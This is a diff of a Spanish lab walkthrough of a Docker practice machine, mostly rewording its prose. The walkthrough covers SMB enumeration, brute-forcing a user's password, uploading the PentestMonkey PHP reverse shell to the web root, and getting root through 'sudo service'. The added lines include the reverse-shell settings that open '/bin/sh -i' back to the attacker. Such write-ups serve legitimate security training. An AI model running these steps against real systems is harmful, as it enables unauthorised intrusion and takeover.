@@ -100,7 +100,7 @@ Esta página parece ser la principal de la aplicación, probablemente a donde re
 
 ### Puertos 139 y 445 SMB
 
-Enumero los recursos compartidos disponibles con `smbmap`.
+Voy a enumerar los recursos a los que tengo acceso haciendo uso de una null session.
 
 ```bash
 > smbmap -H 172.17.0.2
@@ -115,7 +115,7 @@ Enumero los recursos compartidos disponibles con `smbmap`.
 
 - Tengo acceso de lectura al recurso `myshare`
 
-Me conecto al recurso compartido `myshare`.
+Me voy a conectar al recurso compartido `myshare` para ver que contiene. 
 
 ```bash
 > smbclient //172.17.0.2/myshare -N
@@ -125,7 +125,9 @@ Me conecto al recurso compartido `myshare`.
   access.txt                          N      956  Sun Oct  6 00:46:26 2024
 ```
 
-Descargo y examino el archivo `access.txt`.
+- Existe un archivo `access.txt` que me descargue.
+
+Al examinar el archivo me encuentro con esto:
 
 ```bash
 smb: \> get access.txt
@@ -138,7 +140,7 @@ eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhdHJpYW5pN0Blc2VlbWViLmRsIiw
 
 **Enumeración de Usuarios SMB.**
 
-Utilizo `enum4linux` para enumerar usuarios del servicio SMB.
+Con `enum4linux` puedo tratar de enumerar usuarios.
 
 ```bash
 > enum4linux -a 172.17.0.2
@@ -160,7 +162,7 @@ S-1-5-21-3519099135-2650601337-1395019858-1004 SAMBASERVER\administrador (Local 
 
 ### Brute Force SMB
 
-Realizo un ataque de fuerza bruta contra el usuario `satriani7` utilizando `netexec`.
+Al no tener mucha mas informacion opte por realizar un ataque de fuerza bruta contra el usuario `satriani7` utilizando `netexec`.
 
 ```bash
 > nxc smb 172.17.0.2 -u satriani7 -p /usr/share/wordlists/rockyou.txt
@@ -168,9 +170,9 @@ Realizo un ataque de fuerza bruta contra el usuario `satriani7` utilizando `nete
 SMB         172.17.0.2      445    SAMBASERVER      [+] SAMBASERVER\satriani7:50cent
 ```
 
-- Credenciales encontradas: `satriani7:50cent`
+- Encuentro las credenciales: `satriani7:50cent`
 
-Enumero los recursos SMB a los que tiene acceso `satriani7`.
+Ahora puedo enumerar los recursos a los que tiene acceso `satriani7`.
 
 ```bash
 > smbmap -H 172.17.0.2 -u satriani7 -p 50cent
@@ -183,15 +185,15 @@ Enumero los recursos SMB a los que tiene acceso `satriani7`.
 	IPC$                                              	NO ACCESS	IPC Service (EseEmeB Samba Server)
 ```
 
-- Ahora tengo acceso de lectura al recurso `backup24`
+- `satriani7` tiene permiso de lectura en el recurso backup24.
 
-Me conecto al recurso `backup24` y exploro su contenido.
+Me voy a conectar al recurso para enumerarlo:
 
 ```bash
 > smbclient //172.17.0.2/backup24 -U satriani7%50cent
 ```
 
-Dentro del recurso encuentro múltiples directorios y archivos. Después de explorar, encuentro dos archivos interesantes en `/Documents/Personal`:
+Dentro del recurso encuentro múltiples directorios y archivos y después de explorar, encuentro dos archivos interesantes en `/Documents/Personal` los cuales me descargue:
 
 - `credentials.txt`
 - `notes.txt`
@@ -214,7 +216,8 @@ Este documento expone credenciales de usuarios, incluyendo la del usuario admini
 
 - Credenciales: `administrador:Adm1nP4ss2024`
 
-Enumero los recursos a los que tiene acceso el usuario `administrador`.
+
+Con estas nuevas creedenciales puedo volver a enumerar los recursos a los que tiene acceso el usuario `administrador`.
 
 ```bash
 > smbmap -H 172.17.0.2 -u administrador -p Adm1nP4ss2024
@@ -229,48 +232,61 @@ Enumero los recursos a los que tiene acceso el usuario `administrador`.
 
 - Tengo permisos de lectura y escritura en el recurso `home`
 
-Me conecto al recurso `home`.
+Al momento de conectarme al recurso veo lo siguiente.
 
 ```bash
 > smbclient //172.17.0.2/home -U administrador%Adm1nP4ss2024
-```
 
-Listo el contenido del recurso.
-
-```bash
-> smb: \> ls
+smb: \> ls
   .                                   D        0  Mon Nov 10 21:30:21 2025
   ..                                  D        0  Mon Nov 10 21:30:21 2025
   info.php                            N       21  Sun Oct  6 01:32:50 2024
   back.png                            N   463383  Sun Oct  6 01:59:29 2024
   index.php                           N     3543  Sun Oct  6 14:28:45 2024
   productos.php                       N     5229  Sun Oct  6 03:21:48 2024
-  styles.css                          N      263  Sun Oct  6 03:22:06 2024
+  styles.css  
 ```
 
 Podemos ver que estos archivos son identicos a los que encontramos mediante **Fuzzing** por lo cual esto quiere decir que seguramente esta sea la carpeta raiz de la web.
 
 ### Reverse Shell
 
-Descargo la reverse shell de [PentestMonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) y la subo al recurso `home` del SMB.
+Tecnicamente, si el recurso `home` es la raiz de la web, todo lo que suba a este recurso se tiene que ver reflejado en la web.
 
-- Tecnicamente, si el recurso `home` es la raiz de la web, todo lo que suba a este recurso se tiene que ver reflejado en la web.
+Voy a descargar la reverse shell de [PentestMonkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php) y la voy a subir al recurso `home` para tratar de ejecutarla desde la web.
+
+Antes de subir la reverse-shell deberemos editar estas lineas del archivo:
+
+```bash
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127.0.0.1';  // TU IP
+$port = 1234;       // TU PUERTO
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+```
+
+Ahora si podemos subir la reverse-shell al recurso `home`
 
 ```bash
 smb: \> put php-reverse-shell.php
 putting file php-reverse-shell.php as \php-reverse-shell.php (2681.0 kb/s) (average 1340.6 kb/s)
 ```
 
-Me pongo en escucha en mi máquina atacante.
+Antes de ejecutar la reverse-shell me tengo que poner en escucha:
 
 ```bash
 > sudo nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-Accedo a la reverse shell desde el navegador: `http://172.17.0.2/php-reverse-shell.php`
+Ahora puedo acceder a la reverse shell desde el navegador: `http://172.17.0.2/php-reverse-shell.php`
 
-Recibo la conexión y obtengo acceso al sistema.
+Y recibo la conexion exitosamente:
 
 ```bash
 Connection received on 172.17.0.2 56350
@@ -285,7 +301,7 @@ www-data
 
 ## Escalada de Privilegios
 
-Enumero binarios que pueda ejecutar con privilegios elevados.
+Dentro del sistema enumere binarios con privilegios de SUDO.
 
 ```bash
 www-data@0318689382b0:/$ sudo -l
@@ -296,7 +312,7 @@ User www-data may run the following commands on 0318689382b0:
 
 - Puedo ejecutar `service` como root sin contraseña.
 
-Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/service/) para encontrar formas de abusar de `service` con privilegios sudo.
+Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/service/) para encontrar formas de abusar de `service` y escalar a root y encuentro lo siguiente:
 
 ```bash
 www-data@0318689382b0:/$ sudo /usr/sbin/service ../../bin/sh              
@@ -305,6 +321,9 @@ root
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
+- Somos root.
+
 
 ![](assets/Pasted%20image%2020251110214639.png)
 
